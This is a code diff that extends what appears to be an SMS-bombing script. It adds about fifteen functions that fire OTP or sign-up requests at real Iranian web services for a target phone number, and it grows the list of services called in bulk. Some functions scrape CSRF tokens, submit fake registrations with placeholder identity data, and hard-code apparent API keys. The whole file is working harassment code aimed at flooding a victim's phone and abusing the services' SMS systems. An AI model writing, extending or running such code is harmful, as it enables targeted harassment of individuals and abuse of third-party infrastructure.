@@ -70,7 +70,623 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+def activecleaners(phone):
+    try:
+        # پاکسازی شماره
+        clean_phone = re.sub(r"[^\d]", "", phone)
+        if clean_phone.startswith("98"):
+            clean_phone = "0" + clean_phone[2:]
+        elif not clean_phone.startswith("0"):
+            clean_phone = "0" + clean_phone
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print(f"[!] ActiveCleaners: شماره نامعتبر")
+            return False
 
+        url = "https://uapi.activecleaners.ir/Auth/VerifyUser/GetVerifycode"
+        payload = {
+            "mobileOrEmail": clean_phone,
+            "deviceCode": "ActiveClient[Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) "
+                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 "
+                          "Mobile/15E148 Safari/604.1]",
+            "firstName": "",
+            "lastName": "",
+            "password": ""
+        }
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) "
+                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 "
+                          "Mobile/15E148 Safari/604.1"
+        }
+
+        resp = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)
+
+        print(f"[DEBUG] Status: {resp.status_code}")
+        print(f"[DEBUG] Response: {resp.text[:200]}")
+
+        if resp.status_code == 200 and "true" in resp.text.lower():
+            print("[+] ActiveCleaners: درخواست ارسال شد!")
+            return True
+        else:
+            print(f"[-] ActiveCleaners: خطا در ارسال ({resp.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] ActiveCleaners Exception: {e}")
+        return False
+
+
+def washino(phone):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print(f"[!] Washino: شماره نامعتبر")
+            return False
+
+        url = "https://washino.app/wp-admin/admin-ajax.php"
+        payload = {
+            "action": "send_otp",
+            "phone_number": clean_phone
+        }
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
+
+        print(f"[DEBUG] Status: {response.status_code}")
+        print(f"[DEBUG] Response: {response.text[:200]}")
+
+        if response.status_code == 200 and "success" in response.text.lower():
+            print(f"[+] Washino: درخواست ارسال شد!")
+            return True
+        else:
+            print(f"[-] Washino: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Washino Exception: {e}")
+        return False
+
+def abanapps(phone):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print("[!] AbanApps: شماره نامعتبر")
+            return False
+
+        url = "http://dc6.abanapps.ir/api/sms/applogin"
+        payload = {
+            "mobile": clean_phone
+        }
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json;charset=utf-8",
+            "app_token": "abd9c8dc-5c28-44b0-bb91-513193b82213",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+
+        print(f"[DEBUG] Status: {response.status_code}")
+        print(f"[DEBUG] Response: {response.text[:200]}")
+
+        if response.status_code == 200:
+            print("[+] AbanApps: درخواست ارسال شد!")
+            return True
+        else:
+            print(f"[-] AbanApps: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] AbanApps Exception: {e}")
+        return False
+        
+def denro(phone):
+    try:
+        session = requests.Session()
+        login_url = "https://denro.ir/my-account/"   # صفحه ثبت‌نام/ورود
+        
+        # ۱. گرفتن HTML صفحه
+        resp = session.get(login_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
+        if resp.status_code != 200:
+            print("[-] خطا در دریافت صفحه لاگین")
+            return False
+
+        html = resp.text
+
+        # ۲. پیدا کردن instance_id و digits_form
+        instance_id_match = re.search(r'name="instance_id" value="([^"]+)"', html)
+        digits_form_match = re.search(r'name="digits_form" value="([^"]+)"', html)
+
+        if not instance_id_match or not digits_form_match:
+            print("[-] نتونستم instance_id یا digits_form رو پیدا کنم")
+            return False
+
+        instance_id = instance_id_match.group(1)
+        digits_form = digits_form_match.group(1)
+
+        print(f"[DEBUG] instance_id: {instance_id}")
+        print(f"[DEBUG] digits_form: {digits_form}")
+
+        # ۳. ساخت payload
+        payload = {
+            "digt_countrycode": "+98",
+            "phone": phone,
+            "digits_reg_name": "کاربر",
+            "digits_process_register": "1",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "signup_otp_mode": "1",
+            "instance_id": instance_id,
+            "optional_data": "optional_data",
+            "action": "digits_forms_ajax",
+            "type": "register",
+            "dig_otp": "",
+            "digits": "1",
+            "digits_redirect_page": "//denro.ir/product-category/bike/",
+            "digits_form": digits_form,
+            "_wp_http_referer": "/product-category/bike/",
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
+        }
+
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        # ۴. ارسال درخواست OTP
+        otp_url = "https://denro.ir/wp-admin/admin-ajax.php"
+        resp2 = session.post(otp_url, data=payload, headers=headers, timeout=10)
+
+        print(f"[DEBUG] Status: {resp2.status_code}")
+        print(f"[DEBUG] Response: {resp2.text[:200]}")
+
+        if resp2.status_code == 200 and "success" in resp2.text.lower():
+            print("[+] درخواست ارسال شد (باید کد بیاد)")
+            return True
+        else:
+            print("[-] ارسال موفق نبود")
+            return False
+
+    except Exception as e:
+        print(f"[!] Exception: {e}")
+        return False
+        
+        
+def milli_gold(phone, operation="REGISTER_USER"):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '+98' + clean_phone[2:]
+        elif not clean_phone.startswith('+98'):
+            clean_phone = '+98' + clean_phone[1:] if clean_phone.startswith('0') else '+98' + clean_phone
+
+        if not re.match(r"^\+989\d{9}$", clean_phone):
+            print("[!] Milli Gold: شماره نامعتبر")
+            return False
+
+        url = "https://milli.gold/api/v1/public/otp"
+        payload = {
+            "mobileNumber": clean_phone,
+            "operation": operation
+        }
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "X-Platform": "PWA",
+            "X-Channel": "MILLI",
+            "X-Client-Version": "1.0.0"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {str(data)[:200]}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200 and data.get("success", False):
+            print("[+] Milli Gold: OTP ارسال شد")
+            return True
+        else:
+            print(f"[-] Milli Gold: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Milli Gold Exception: {e}")
+        return False
+        
+        
+def technogold(phone, token=None):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print("[!] TechnoGold: شماره نامعتبر")
+            return False
+
+        url = "https://api2.technogold.gold/customer/auth/send-otp?device_type=web"
+        payload = {"mobile": clean_phone}
+
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+        }
+        if token:
+            headers["x-token"] = token
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {str(data)[:200]}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200 and data.get("success", False):
+            print("[+] TechnoGold: OTP ارسال شد")
+            return True
+        else:
+            print(f"[-] TechnoGold: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] TechnoGold Exception: {e}")
+        return False
+        
+def bargheto(phone):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print("[!] Bargheto: شماره نامعتبر")
+            return False
+
+        url = "https://back.bargheto.com:13002/Authentication/SendOtp"
+        payload = {"PhoneNumber": clean_phone}
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Authorization": "undefined"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {str(data)[:200]}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200 and data.get("success", False):
+            print("[+] Bargheto: OTP ارسال شد")
+            return True
+        else:
+            print(f"[-] Bargheto: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Bargheto Exception: {e}")
+        return False
+
+
+
+def barghapp(phone, firstname="نام", lastname="خانوادگی", nationalCode="3344434443", gender="1", provinceId=4, cityId=124, zipCode="73763736"):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print("[!] BarghApp: شماره نامعتبر")
+            return False
+
+        url = "http://barghapp.clean-energy.ir:64430/api/Authenticate/RegisterReal"
+        payload = {
+            "nationalCode": nationalCode,
+            "mobile": clean_phone,
+            "firstName": firstname,
+            "lastName": lastname,
+            "gender": gender,
+            "provinceId": provinceId,
+            "cityId": cityId,
+            "address": None,
+            "zipCode": zipCode,
+            "emailAddress": None
+        }
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {str(data)[:200]}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200 and data.get("success", True):  # برخی API ها success ندارند
+            print("[+] BarghApp: درخواست ثبت نام ارسال شد")
+            return True
+        else:
+            print(f"[-] BarghApp: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] BarghApp Exception: {e}")
+        return False
+        
+        
+        
+
+def azno(phone):
+    try:
+        phone = re.sub(r"^(?:\+98|98|0)?", "0", phone)
+        if not re.match(r"^09\d{9}$", phone):
+            print("[!] Azno: شماره نامعتبر"); return False
+
+        url = f"https://api-main.azno.space/api/Auth/SendOTP?phoneNumber={phone}&method=sms"
+        r = requests.post(url, headers={"Accept":"application/json","Content-Type":"application/json"}, timeout=10)
+
+        data = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
+        if r.status_code == 200 and data.get("success"):
+            print("[+] Azno: OTP ارسال شد"); return True
+        print(f"[-] Azno: خطا ({r.status_code})"); return False
+
+    except Exception as e:
+        print(f"[!] Azno Exception: {e}"); return False
+
+
+def denj(phone):
+    try:
+        phone = re.sub(r"^(?:\+98|98|0)?", "0", phone)
+        if not re.match(r"^09\d{9}$", phone):
+            return False
+
+        r = requests.post(
+            "https://api.denj.space/api/v1/account/auth/register-or-login/",
+            json={"phone_number": phone},
+            headers={"Accept": "application/json", "Content-Type": "application/json"},
+            timeout=10
+        )
+        return r.status_code == 200
+    except:
+        return False
+        
+        
+def eghamat24(phone):
+    try:
+        session = requests.Session()
+        
+        # 1. صفحه اصلی
+        main_url = "https://www.eghamat24.com/"
+        resp = session.get(main_url, timeout=10)
+        if resp.status_code != 200:
+            print(f"[-] Eghamat24: خطا در دریافت صفحه ({resp.status_code})")
+            return False
+        
+        # 2. گرفتن XSRF-TOKEN
+        xsrf_token = session.cookies.get("XSRF-TOKEN")
+        if not xsrf_token:
+            print("[-] Eghamat24: نتونستم XSRF-TOKEN پیدا کنم")
+            return False
+        
+        # 3. هدرها
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Client-Token": "MzJhY2UwMTM0NjQ4ZTg1Njg4M2JiMzA1YWIyNzRhYWU3ZGVmZTEwZQ==",
+            "x-api-key": "PNF0)VZI|*nLpY:V+@r$*ZrISF?ru2_,-K5tC5}O5x19yv;XUwHpI(!XBhl?C.MD",
+            "Content-Type": "application/json",
+            "X-XSRF-TOKEN": xsrf_token,
+        }
+
+        payload = {"username": phone}
+
+        # 4. ارسال
+        url = "https://www.eghamat24.com/user/v2/send-otp"
+        r = session.post(url, json=payload, headers=headers, timeout=10)
+
+        print(f"[DEBUG] Status: {r.status_code}")
+        try:
+            data = r.json()
+            print(f"[DEBUG] Response: {data}")
+        except:
+            print(f"[DEBUG] Response text: {r.text[:200]}")
+            return False
+
+        # شرط موفقیت درست
+        if r.status_code == 200 and data.get("code") == 200:
+            print("[+] Eghamat24: کد ارسال شد ✅")
+            return True
+        else:
+            print(f"[-] Eghamat24: خطا ({data})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Eghamat24 Exception: {e}")
+        return False
+        
+
+def hotelyar(phone):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print("[!] HotelYar: شماره نامعتبر")
+            return False
+
+        url = "https://hotelyar.com/api/handle-api"
+        payload = {
+            "options": {
+                "method": "POST",
+                "body": {"mobile": clean_phone},
+                "headers": {"Content-Type": "application/json"}
+            },
+            "endPoint": "/login-register"
+        }
+
+        headers = {
+            "Content-Type": "application/json"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {str(data)[:200]}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200:
+            print("[+] HotelYar: درخواست ارسال شد")
+            return True
+        else:
+            print(f"[-] HotelYar: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] HotelYar Exception: {e}")
+        return False
+        
+        
+def cita(phone, auth="Basic Y2xpZW50QXBwSWQ6dGVzdA=="):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print("[!] Cita: شماره نامعتبر")
+            return False
+
+        url = f"https://api.cita.ir/auth/tsv/generate"
+        payload = {"username": clean_phone}  # مطابق نمونه‌ی شما
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Authorization": auth,
+            "Accept": "application/json"
+        }
+
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {str(data)[:200]}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200 and data.get("success", True):  # برخی APIها success ندارن
+            print("[+] Cita: OTP ارسال شد")
+            return True
+        else:
+            print(f"[-] Cita: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Cita Exception: {e}")
+        return False
+        
+def safarbazi(phone, name="نام و نام خانوادگی", password="123456Mm@"):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print("[!] Safarbazi: شماره نامعتبر")
+            return False
+
+        url = "https://api.safarbazi.com/v1/codes/send-code"
+        payload = {
+            "dialing_prefix": "+98",
+            "mobile": clean_phone[1:],  # بدون صفر اول
+            "name": name,
+            "password": password,
+            "password_confirmation": password
+        }
+
+        headers = {
+            "Content-Type": "application/json"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {str(data)[:200]}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200 and data.get("success", True):
+            print("[+] Safarbazi: OTP ارسال شد")
+            return True
+        else:
+            print(f"[-] Safarbazi: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Safarbazi Exception: {e}")
+        return False
+        
 
 def bit24(phone):
     try:
@@ -3724,16 +4340,17 @@ def iranhotel(phone):
 # ==========================
 
 services = [
-    abantether, accounts1606, achareh, alibaba, alldigitall, alopeyk_safir, angeliran, arzplus, arzunex, azkivam,
-    Balad, banimode, barghman, Besparto, bimebazar, bit24, bitpin, bodoroj, booking, candom_shop,
-    Charsooq, charter118, coinkade, dastakht, dgshahr, digikala, DigikalaJet, divar, drnext, drto,
-    elanza, fadaktrains, gap, gapfilm, ghasedak24, gruccia, hajamooo, harikashop, ilozi, iranhotel,
-    instagram_send, katonikhan, katoonistore, komodaa, Koohshid, mahabadperfume, malltina, masterkala, mek, missomister,
-    mo7_ir, mobilex, mootanroo, mrbilit, mydigipay, nikpardakht, niktakala, Okala, okorosh, otaghak,
-    ompfinex, paklean_call, payaneh, payonshoes, pindo, pinket, ragham_call, raastin, riiha, Sandalestan,
-    ShahreSandal, shahrfarsh, sibapp, sibbank, sarmayex, smarket, snapp, snappshop, tabdeal, tapsi,
-    tapsi_food, tebinja, telegram_send, tetherland, theshoes, torobpay, trip, trip_call, twox, ubitex,
-    vakiljo, virgool, vitrin_shop
+    abantether, accounts1606, achareh, abanapps, activecleaners, alibaba, alldigitall, alopeyk_safir, angeliran, arzplus,
+    arzunex, azkivam, azno, Balad, banimode, barghapp, barghman, Besparto, bimebazar, bit24,
+    bitpin, bodoroj, booking, candom_shop, Charsooq, charter118, cita, coinkade, dastakht, denj,
+    denro, dgshahr, digikala, DigikalaJet, divar, drnext, drto, elanza, fadaktrains, gap,
+    gapfilm, ghasedak24, gruccia, hajamooo, harikashop, hotelyar, ilozi, iranhotel, instagram_send, katonikhan,
+    katoonistore, komodaa, Koohshid, mahabadperfume, malltina, masterkala, mek, milli_gold, missomister, mo7_ir,
+    mobilex, mootanroo, mrbilit, mydigipay, nikpardakht, niktakala, Okala, okorosh, otaghak, ompfinex,
+    paklean_call, payaneh, payonshoes, pindo, pinket, ragham_call, raastin, riiha, Sandalestan, ShahreSandal,
+    shahrfarsh, safarbazi, sarmayex, sibapp, sibbank, smarket, snapp, snappshop, tabdeal, tapsi,
+    tapsi_food, tebinja, telegram_send, tetherland, theshoes, torobpay, trip, trip_call, technogold, twox,
+    ubitex, vakiljo, virgool, vitrin_shop, washino
 ]
 
 
